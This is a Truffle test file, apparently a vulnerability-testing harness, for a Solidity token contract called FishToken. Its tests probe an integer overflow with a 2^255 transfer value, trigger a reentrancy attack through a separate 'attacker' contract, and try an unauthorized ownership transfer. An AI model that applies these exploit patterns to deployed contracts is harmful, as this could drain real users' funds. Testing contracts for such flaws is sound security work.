const FishToken = artifacts.require("FishToken");
const attacker = artifacts.require("attacker");
contract('FishToken', async (accounts) => {
    const owner = accounts[0];
    const timePeriodInSeconds = 3600;
    const from = Math.floor(new Date() / 1000);
    const bigValue = web3.utils.toBN('57896044618658097711785492504343953926634992332820282019728792003956564819968');
    let instance;
    let attack_instance;
    let result;
    const to = from + timePeriodInSeconds;
    before('setup contract for each test', async () => {
        instance = await FishToken.new(to, {from: accounts[0]});
        console.log("contract_name:FishToken:" + instance.address);
        attack_instance = await attacker.new(instance.address, {from: accounts[0]});
        console.log("contract_name:attacker:" + attack_instance.address);

    });
    it('test 0', async () => {
        await instance.issueTokens({from: accounts[0], value: 10000});
        await instance.issueTokens({from: accounts[1], value: 10000});
        await instance.issueTokens({from: accounts[2], value: 10000});
        await instance.issueTokens({from: accounts[3], value: 10000});
        await instance.issueTokens({from: accounts[4], value: 10000});
        await instance.issueTokens({from: accounts[5], value: 10000});

        await instance.transfer(accounts[2], 111, {from: accounts[3]});
        await instance.transfer(accounts[4], 222, {from: accounts[3]});
        await instance.transfer(accounts[5], 333, {from: accounts[3]});
        await instance.transfer(accounts[1], 444, {from: accounts[3]});

        await instance.transfer(accounts[1], 20000, {from: accounts[3]});

        result = await instance.balanceOf(accounts[3]);
        console.log(result.toString());

        result = await instance.balanceOf(accounts[1]);
        console.log(result.toString());

        result = await instance.balanceOf(accounts[2]);
        console.log(result.toString());

        result = await instance.balanceOf(accounts[4]);
        console.log(result.toString());

        result = await instance.balanceOf(accounts[5]);
        console.log(result.toString());

        console.log(await web3.eth.getBalance(instance.address))
    });

    it('unnormal_transfer', async () => {

        console.log("Before unnormal_transfer");
        result = await instance.balanceOf(accounts[1]);
        console.log("account[1]_balance : " + result.toString());
        result = await instance.balanceOf(accounts[3]);
        console.log("account[3]_balance : " + result.toString());

        await instance.transfer(accounts[1], bigValue, {from: accounts[3]});

        result = await instance.balanceOf(accounts[3]);

        console.log("After unnormal_transfer");
        result = await instance.balanceOf(accounts[1]);
        console.log("account[1]_balance : " + result.toString());
        result = await instance.balanceOf(accounts[3]);
        console.log("account[3]_balance : " + result.toString());
    });

    it('attack_Re_entry', async () => {
        console.log(await web3.eth.getBalance(attack_instance.address));
        await attack_instance.pwnEtherStore({from: accounts[10], value: 10000});
        console.log(await web3.eth.getBalance(attack_instance.address));
    });

    it('change_Owner', async () => {
        console.log("before_owner:" + await instance.owner());
        await instance.transferOwnership(accounts[1], {from: accounts[10]});
        console.log("after_owner:" + await instance.owner());
    });
});

